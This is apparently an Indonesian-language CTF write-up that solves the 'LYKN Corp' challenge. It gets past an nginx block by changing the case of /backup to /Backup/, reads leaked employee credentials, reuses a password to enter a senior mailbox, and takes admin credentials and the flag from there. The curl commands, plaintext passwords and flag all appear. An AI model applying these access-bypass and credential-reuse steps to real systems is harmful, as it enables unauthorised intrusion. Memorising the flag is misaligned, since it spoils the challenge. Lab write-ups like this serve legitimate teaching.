# LYKN Corp

## Ringkasan

Portal mail LYKN punya direktori backup yang diblok lewat `/backup`, tapi nginx masih melayani path case-sensitive `/Backup/`. Directory listing di path itu membocorkan kredensial employee. Dari mailbox employee senior ditemukan kredensial admin, lalu halaman `/admin` menampilkan flag.

Flag:

```text
LYKNCTF{03c01a433cef448a94e4f1b6d90122ce}
```

## Eksploitasi

Target:

```text
http://65352921-0b1b-42e3-8a49-6f7a1362b06a.51.79.140.18.nip.io:8080/
```

`robots.txt` memberi hint ke direktori backup:

```bash
curl -s http://65352921-0b1b-42e3-8a49-6f7a1362b06a.51.79.140.18.nip.io:8080/robots.txt
```

Output:

```text
User-agent: *
Disallow: /backup
```

Path lowercase `/backup` diblok 403, tapi `/Backup/` bisa diakses karena rule nginx-nya tidak menutup variasi case tersebut.

```bash
curl -s http://65352921-0b1b-42e3-8a49-6f7a1362b06a.51.79.140.18.nip.io:8080/Backup/
```

Output:

```html
<a href="credentials.txt">credentials.txt</a>
```

File `credentials.txt` berisi akun employee:

```bash
curl -s http://65352921-0b1b-42e3-8a49-6f7a1362b06a.51.79.140.18.nip.io:8080/Backup/credentials.txt
```

Output:

```text
New Employee Credentials
======================
Username: tuan.nguyen
Password: Welcome123!
```

Login sebagai `tuan.nguyen` hanya memberi akses inbox employee biasa. Password onboarding yang sama ternyata juga valid untuk `minh.le`, user senior yang muncul sebagai pengirim email onboarding.

Mailbox `minh.le` punya email dari admin dengan kredensial service account:

```text
Username: admin
Password: Adm1n_S3cur3_P@ss_2026
```

Login sebagai admin mengarah ke `/admin` dan halaman tersebut menampilkan flag:

```text
LYKNCTF{03c01a433cef448a94e4f1b6d90122ce}
```

